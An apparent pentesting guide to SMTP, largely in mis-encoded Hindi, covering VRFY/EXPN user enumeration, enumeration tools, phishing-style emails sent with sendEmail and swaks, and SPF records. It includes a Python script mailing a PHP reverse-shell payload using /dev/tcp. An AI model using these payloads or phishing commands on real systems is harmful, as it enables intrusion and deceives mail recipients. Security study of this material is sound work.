VRFY (Verify) рдХрд╛ рдЙрдкрдпреЛрдЧ SMTP (Simple Mail Transfer Protocol) рд╕рд░реНрд╡рд░ рдкрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЛрдВ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдЖрдо SMTP рдХрдорд╛рдВрдб рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЛрдВ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддрд╛ рдореМрдЬреВрдж рд╣реИ, рддреЛ рд╕рд░реНрд╡рд░ рдПрдХ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рднреЗрдЬреЗрдЧрд╛, рдЕрдиреНрдпрдерд╛ рдПрдХ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рднреЗрдЬреЗрдЧрд╛ред

рдпрд╣ рдПрдХ рдЖрдо рдЯреЗрдХреНрдирд┐рдХ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЛрдВ рдХреА рдПрдХ рд╕реВрдЪреА рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдФрд░ рдПрдХ рдирд┐рд╢реНрдЪрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЗ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдкреНрд░рд╛рдердорд┐рдХ рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЦрд╛рддреЛрдВ рдХреА рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдЕрдиреНрдп рд╣рдорд▓реЛрдВ рдХреЗ рд▓рд┐рдП рддреИрдпрд╛рд░реА рдХрд░рдиреЗ рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```
$ telnet 10.0.0.1 25
Trying 10.0.0.1...
Connected to 10.0.0.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello [10.0.0.99], pleased to meet you
VRFY root
250 Super-User <root@myhost>
VRFY blah
550 blah... User unknown
```
### EXPN

The EXPN command is used to expand a mailing list on an SMTP server. It can be used to obtain information about the members of a mailing list, including their email addresses. This command can be useful for reconnaissance purposes during a penetration test.

To use the EXPN command, you can simply send the following command to the SMTP server:

```
EXPN <mailing_list_name>
```

Replace `<mailing_list_name>` with the name of the mailing list you want to expand. If the server supports the EXPN command and the mailing list exists, it will respond with the expanded list of email addresses.

It's important to note that not all SMTP servers support the EXPN command, as it can be a security risk. Some servers may disable this command to prevent unauthorized access to mailing list information.

During a penetration test, the EXPN command can be used to gather information about potential targets or to verify the existence of specific email addresses. However, it's crucial to obtain proper authorization before performing any penetration testing activities.
```
$ telnet 10.0.10.1 25
Trying 10.0.10.1...
Connected to 10.0.10.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 <ed.williams@myhost>
EXPN sshd
250 2.1.5 sshd privsep <sshd@mail2>
```
### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг

Automatic tools are software programs that are designed to perform specific tasks automatically, without the need for manual intervention. In the context of username enumeration techniques, automatic tools can be used to quickly and efficiently enumerate usernames on a target system.

There are several automatic tools available that can be used for username enumeration during a penetration test. These tools leverage various techniques to gather information about valid usernames on a target system. Some common techniques used by these tools include:

- **Dictionary-based attacks**: These tools use a predefined list of common usernames and passwords to attempt to log in to a target system. By comparing the response received from the system, the tool can determine if a username is valid or not.

- **Brute-force attacks**: These tools systematically generate and test different combinations of usernames and passwords to gain unauthorized access to a target system. By analyzing the response received from the system, the tool can identify valid usernames.

- **User enumeration attacks**: These tools exploit vulnerabilities in the target system's authentication mechanism to determine if a username is valid or not. For example, some systems may respond differently when an invalid username is entered compared to a valid username. By analyzing these responses, the tool can identify valid usernames.

It is important to note that the use of automatic tools for username enumeration should be done with caution and with proper authorization. Unauthorized or malicious use of these tools can lead to legal consequences.
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**рдбреНрд░реИрдЧрдирдЬрд╛рд░ рд╕реБрд░рдХреНрд╖рд╛ рд╕рдореНрдореЗрд▓рди рдПрдХ рдЕрдВрддрд░реНрд░рд╛рд╖реНрдЯреНрд░реАрдп рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ**](https://www.dragonjarcon.org/), рдЬреЛ 7 рдФрд░ 8 рд╕рд┐рддрдВрдмрд░ 2023 рдХреЛ рдХреЛрд▓рдВрдмрд┐рдпрд╛ рдХреЗ рдмреЛрдЧреЛрдЯрд╛ рдореЗрдВ рдЖрдпреЛрдЬрд┐рдд рд╣реЛрдЧрд╛ред рдпрд╣ рдПрдХ рддрдХрдиреАрдХреА рднрд░рдкреВрд░ рд╕рд╛рдордЧреНрд░реА рд╡рд╛рд▓рд╛ рдЖрдпреЛрдЬрди рд╣реИ рдЬрд╣рд╛рдВ рд╕реНрдкреЗрдирд┐рд╢ рдореЗрдВ рдирд╡реАрдирддрдо рд╢реЛрдз рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЬреЛ рджреБрдирд┐рдпрд╛ рднрд░ рдХреЗ рд╣реИрдХрд░реНрд╕ рдФрд░ рд╢реЛрдзрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЖрдХрд░реНрд╖рд┐рдд рдХрд░рддреЗ рд╣реИрдВред\
рдЗрд╕ рдорд╣рд╛рди рд╕рдореНрдореЗрд▓рди рдХреЛ рди рдЫреЛрдбрд╝реЗрдВ, рдЕрдм рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рд▓рд┐рдВрдХ рдкрд░ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░реЗрдВ!:

{% embed url="https://www.dragonjarcon.org/" %}

## DSN рд░рд┐рдкреЛрд░реНрдЯ

**рд╡рд┐рддрд░рдг рд╕реНрдерд┐рддрд┐ рд╕реВрдЪрдирд╛ рд░рд┐рдкреЛрд░реНрдЯ**: рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рд╕рдВрдЧрдарди рдХреЛ рдПрдХ **рдЕрдорд╛рдиреНрдп рдкрддреЗ** рдкрд░ рдПрдХ **рдИрдореЗрд▓** рднреЗрдЬрддреЗ рд╣реИрдВ, рддреЛ рд╕рдВрдЧрдарди рдЖрдкрдХреЛ рдПрдХ **рдореЗрд▓ рд╡рд╛рдкрд╕ рднреЗрдЬрдХрд░** рдмрддрд╛рдПрдЧрд╛ рдХрд┐ рдкрддрд╛ рдЕрдорд╛рдиреНрдп рд╣реИред рд╡рд╛рдкрд╕ рднреЗрдЬреЗ рдЧрдП рдИрдореЗрд▓ рдХреЗ **рд╣реИрдбрд░** рдореЗрдВ рд╕рдВрднрд╛рд╡рд┐рдд **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА** рд╣реЛрдЧреА (рдЬреИрд╕реЗ рд░рд┐рдкреЛрд░реНрдЯ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдореЗрд▓ рд╕реЗрд╡рд╛ рдХреЗ IP рдкрддреЗ рдпрд╛ рдПрдВрдЯреАрд╡рд╛рдпрд░рд╕ рд╕реЙрдлрд╝реНрдЯрд╡реЗрдпрд░ рдЬрд╛рдирдХрд╛рд░реА)ред

## [Commands](smtp-commands.md)

### рд▓рд┐рдирдХреНрд╕ рдХрдВрд╕реЛрд▓ рд╕реЗ рдИрдореЗрд▓ рднреЗрдЬрдирд╛
```
root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

IT Dept,

We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.

Sincerely,
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### Python рдХреЗ рд╕рд╛рде рдИрдореЗрд▓ рднреЗрдЬрдирд╛

рдпрд╣рд╛рдВ рдкрд╛рдпрдерди рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рд╕рд╛рде рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХрд╛ рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рддрд░реАрдХрд╛ рд╣реИред

```python
import smtplib

def send_email(sender_email, receiver_email, subject, message):
    try:
        # рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВ
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, 'your_password')
        
        # рдИрдореЗрд▓ рддреИрдпрд╛рд░ рдХрд░реЗрдВ
        email_message = f'Subject: {subject}\n\n{message}'
        
        # рдИрдореЗрд▓ рднреЗрдЬреЗрдВ
        server.sendmail(sender_email, receiver_email, email_message)
        print('Email sent successfully!')
    except Exception as e:
        print(f'An error occurred: {e}')
    finally:
        # рд╕рд░реНрд╡рд░ рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдмрдВрдж рдХрд░реЗрдВ
        server.quit()

# рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдЬрд╛рдирдХрд╛рд░реА
sender_email = 'your_email@gmail.com'
receiver_email = 'receiver_email@gmail.com'
subject = 'Hello from Python!'
message = 'This is a test email sent using Python.'

# рдИрдореЗрд▓ рднреЗрдЬреЗрдВ
send_email(sender_email, receiver_email, subject, message)
```

рдпрд╣рд╛рдВ `sender_email` рдФрд░ `receiver_email` рдХреЛ рдЕрдкрдиреЗ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдИрдореЗрд▓ рдкрддреЗ рдХреЗ рд╕рд╛рде рдмрджрд▓реЗрдВ рдФрд░ `your_password` рдХреЛ рдЕрдкрдиреЗ рдИрдореЗрд▓ рдЦрд╛рддреЗ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗ рдмрджрд▓реЗрдВред рдлрд┐рд░ рдЖрдк рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдЪрд▓рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдИрдореЗрд▓ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
## рдореЗрд▓ рд╕реНрдкреВрдлрд┐рдВрдЧ

рдЗрд╕ рдЕрдзреНрдпрд╛рдп рдХрд╛ рдЕрдзрд┐рдХрд╛рдВрд╢ рднрд╛рдЧ рдкреБрд╕реНрддрдХ **рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛ рдореВрд▓реНрдпрд╛рдВрдХрди 3 рд╡реАрдВ рд╕рдВрд╕реНрдХрд░рдг** рд╕реЗ рдирд┐рдХрд╛рд▓рд╛ рдЧрдпрд╛ рд╣реИред

SMTP рд╕рдВрджреЗрд╢ рдЖрд╕рд╛рдиреА рд╕реЗ рд╕реНрдкреВрдл рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рд╕рдВрдЧрдарди **SPF**, **DKIM**, рдФрд░ **DMARC** рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдкрдХреНрд╖ рдЕрдирдзрд┐рдХреГрдд рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рд╕реЗ рд░реЛрдХ рд╕рдХреЗрдВред

рдЗрди рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЗ **рдкреВрд░реНрдг рдЧрд╛рдЗрдб** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдпрд╣рд╛рдВ рдЬрд╛рдирдХрд╛рд░реА рдорд┐рд▓ рд╕рдХрддреА рд╣реИ: [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/)

### SPF

{% hint style="danger" %}
SPF [2014 рдореЗрдВ "рд╡рд┐рд░рд╛рдо" рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/)ред рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЗрд╕рдХреЗ рдмрдЬрд╛рдп `_spf.domain.com` рдореЗрдВ **TXT рд░рд┐рдХреЙрд░реНрдб** рдмрдирд╛рдиреЗ рдХреА рдмрдЬрд╛рдп рдЖрдкрдХреЛ `domain.com` рдореЗрдВ рдЙрд╕реА рд╡рд╛рдХреНрдпрд╛рдВрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдкрд┐рдЫрд▓реЗ spf рд░рд┐рдХреЙрд░реНрдб рдХрд╛ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╕рд╛рдорд╛рдиреНрдп рд╣реИ, рдЬреИрд╕реЗ `"v=spf1 include:_spf.google.com ~all"` рдРрд╕рд╛ рдХреБрдЫ рднреА рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

**рднреЗрдЬрдиреЗ рд╡рд╛рд▓реА рдиреАрддрд┐ рдврд╛рдВрдЪрд╛** (SPF) рдПрдХ рдРрд╕реА рддрдВрддреНрд░рд┐рдХрд╛ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдордЯреАрдПрдПрд╕ рдХреЛ рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдХрд┐ рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рд╡рд╛рд▓рд╛ рд╣реЛрд╕реНрдЯ рдЕрдзрд┐рдХреГрдд рд╣реИ рдпрд╛ рдирд╣реАрдВред\
рдлрд┐рд░, рд╕рдВрдЧрдарди рдПрдХ рдЕрдзрд┐рдХреГрдд рдореЗрд▓ рд╕рд░реНрд╡рд░реЛрдВ рдХреА рд╕реВрдЪреА рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдордЯреАрдПрдПрд╕ рдЗрд╕ рд╕реВрдЪреА рдХреЗ рд▓рд┐рдП рдХреНрд╡реЗрд░реА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдИрдореЗрд▓ рд╕реНрдкреВрдл рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВред\
рдПрдХ рдбреЛрдореЗрди рдирд╛рдо рдХреЗ рд▓рд┐рдП рдИрдореЗрд▓ рднреЗрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓реЗ рдЖрдИрдкреА тАЛтАЛрдкрддреЗ / рд╕реАрдорд╛рдУрдВ, рдбреЛрдореЗрди рдФрд░ рдЕрдиреНрдпреЛрдВ рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, SPF рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди "**рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо**" рдкреНрд░рдХрдЯ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

#### рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо

| рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо | рд╡рд┐рд╡рд░рдг                                                                                                                                                                                                                                                                                                                            |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| рд╕рдм       | рд╣рдореЗрд╢рд╛ рдорд┐рд▓рддрд╛ рд╣реИ; рдкрд┐рдЫрд▓реЗ рдореЗрдХреЗрдирд┐рдЬрд╝реНрдореЛрдВ рджреНрд╡рд╛рд░рд╛ рдорд┐рд▓рд╛рдП рдЧрдП рд╕рднреА рдЖрдИрдкреА рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрд░рд┐рдгрд╛рдо рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред                                                                                                                                                                                                                                  |
| рдП         | рдпрджрд┐ рдбреЛрдореЗрди рдирд╛рдо рдХреЗ рдкрд╛рд╕ рдРрдбреНрд░реЗрд╕ рд░рд┐рдХреЙрд░реНрдб (рдП рдпрд╛ рдПрдПрдПрдП) рд╣реИ рдЬрд┐рд╕реЗ рднреЗрдЬрдиреЗ рд╡рд╛рд▓реЗ рдХреЗ рдкрддреЗ рдХреЛ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдорд┐рд▓реЗрдЧрд╛ред                                                                                                                                                                                                                |
| рдЖрдИрдкреА4       | рдпрджрд┐ рднреЗрдЬрдиреЗ рд╡рд╛рд▓рд╛ рджрд┐рдП рдЧрдП IPv4 рдкрддреЗ рдХреЗ рднреАрддрд░ рд╣реИ, рддреЛ рдорд┐рд▓реЗрдЧрд╛ред                                                                                                                                                                                                                                                                             |
| рдЖрдИрдкреА6       | рдпрджрд┐ рднреЗрдЬрдиреЗ рд╡рд╛рд▓рд╛ рджрд┐рдП рдЧрдП IPv6 рдкрддреЗ рдХреЗ рднреАрддрд░ рд╣реИ, рддреЛ рдорд┐рд▓реЗрдЧрд╛ред                                                                                                                                                                                                                                                                             |
| рдПрдордПрдХреНрд╕        | рдпрджрд┐ рдбреЛрдореЗрди рдирд╛рдо рдХреЗ рдкрд╛рд╕ рднреЗрдЬрдиреЗ рд╡рд╛рд▓реЗ рдХреЗ рдкрддреЗ рдХреЛ рд╣рд▓ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдПрдордПрдХреНрд╕ рд░рд┐рдХреЙрд░реНрдб рд╣реИ, рддреЛ рдорд┐рд▓реЗрдЧрд╛ (рдЕрд░реНрдерд╛рдд рдкрддреНрд░ рдбреЛрдореЗрди рдХреЗ рдЖрдЧрдорди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдореЗрд▓ рд╕рд░реНрд╡рд░реЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╕реЗ рдореЗрд▓ рдЖрддрд╛ рд╣реИ)ред                                                                                                                                                                          |
| рдкреАрдЯреАрдЖрд░       | рдпрджрд┐ рдЧреНрд░рд╛рд╣рдХ рдХреЗ рдкрддреЗ рдХреЗ рд▓рд┐рдП рдбреЛрдореЗрди рдирд╛рдо (рдкреАрдЯреАрдЖрд░ рд░рд┐рдХреЙрд░реНрдб) рджрд┐рдП рдЧрдП рдбреЛрдореЗрди рдореЗрдВ рд╣реИ рдФрд░ рд╡рд╣ рдбреЛрдореЗрди рдирд╛рдо рдЧреНрд░рд╛рд╣рдХ рдХреЗ рдкрддреЗ рдХреЛ рд╣рд▓ рдХрд░рддрд╛ рд╣реИ (рдлрд╝реЙрд░рд╡рд░реНрдб-рдХрдиреНрдлрд╝рд░реНрдореНрдб рд░рд┐рд╡рд░реНрд╕ DNS), рддреЛ рдорд┐рд▓реЗрдЧрд╛ред рдпрд╣ рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ рддреЛ рдЗрд╕рд╕реЗ рдмрдЪрдирд╛ рдЪрд╛рд╣рд┐рдПред                                                                                                                     |
| рдореМрдЬреВрдж рд╣реИ    | рдпрджрд┐ рджрд┐рдП рдЧрдП рдбреЛрдореЗрди рдирд╛рдо рдХреЛ рдХрд┐рд╕реА рднреА рдкрддреЗ рдХреЛ рд╣рд▓ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдорд┐рд▓реЗрдЧрд╛ (рдЪрд╛рд╣реЗ рд╡рд╣ рдкрддрд╛ рдХрд┐рд╕реА рднреА рдкрддреЗ рдХреЛ рд╣рд▓ рдХрд░рддрд╛ рд╣реЛ)ред рдпрд╣ рдмрд╣реБрдд рдХрдо рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред SPF рдореИрдХреНрд░реЛ рднрд╛рд╖рд╛ рдХреЗ рд╕рд╛рде рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ DNSBL-рдХреНрд╡реЗрд░реА рдЬреИрд╕реЗ рдЕрдзрд┐рдХ рдЬрдЯрд┐рд▓ рдорд┐рд▓рд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИред                                                                                                                           |
| рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ   | рджреВрд╕рд░реЗ рдбреЛрдореЗрди рдХреА рдиреАрддрд┐ рдХрд╛ рд╕рдВрджрд░реНрдн рджреЗрддрд╛ рд╣реИред рдпрджрд┐ рдЙрд╕ рдбреЛрдореЗрди рдХреА рдиреАрддрд┐ рдкрд╛рд╕ рд╣реЛрддреА рд╣реИ, рддреЛ рдпрд╣ рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рдкрд╛рд╕ рд╣реЛрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрджрд┐ рд╕рдореНрдорд┐рд▓рд┐рдд рдиреАрддрд┐ рдЕрд╕рдлрд▓ рд╣реЛрддреА рд╣реИ, рддреЛ рдкреНрд░рд╕рдВрд╕реНрдХрд░рдг рдЬрд╛рд░реА рд░рд╣рддрд╛ рд╣реИред рджреВрд╕рд░реЗ рдбреЛрдореЗрди рдХреА рдиреАрддрд┐ рдХреЛ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╕реМрдВрдкрдиреЗ рдХреЗ рд▓рд┐рдП, рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рд╡рд┐рд╕реНрддрд╛рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред                                                                                     |
| рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди  | <p>рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдПрдХ рдРрд╕рд╛ рджреВрд╕рд░реЗ рдбреЛрдореЗрди рдирд╛рдо рдХреЗ рд▓рд┐рдП рдкреЙрдЗрдВрдЯрд░ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ SPF рдиреАрддрд┐ рд╣реЛрддреА рд╣реИ, рдЗрд╕рд╕реЗ рдХрдИ рдбреЛрдореЗрди рдПрдХ рд╣реА SPF рдиреАрддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣ рдЬрдм рдХрд╛рдо рдореЗрдВ рд▓рд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм рдПрдХ рдмрдбрд╝реА рд╕рдВрдЦреНрдпрд╛ рдХреЗ рдбреЛрдореЗрди рдХреЗ рд╕рд╛рде рдХрд╛рдо рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реЛ рдЬреЛ рдПрдХ рд╣реА рдИрдореЗрд▓ рдЗрдВрдлреНрд░рд╛рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЛ рд╕рд╛рдЭрд╛ рдХрд░рддреЗ рд╣реИрдВред</p><p>рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдП рдЧрдП рдбреЛрдореЗрди рдХреА SPF рдиреАрддрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред</p> |

**рдХреНрд╡рд╛рд▓рд┐рдлрд╝рд╛рдпрд░реНрд╕** рднреА рдкрд╣рдЪрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╡ рд╣реИрдВ, рдЬреЛ **рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдпрджрд┐ рдХреЛрдИ рдореЗрдХреЗрдирд┐рдЬрд╝реНрдо рдорд┐рд▓рддрд╛ рд╣реИ рддреЛ рдХреНрдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП**ред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, **рдХреНрд╡рд╛рд▓рд┐рдлрд╝рд╛рдпрд░ "+"** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдХреЛрдИ
```shell-session
kali@kali:~$ dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

kali@kali:~$ dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

kali@kali:~$ dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

kali@kali:~$ dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

kali@kali:~$ dig txt _netblocks3.google.com | grep spf
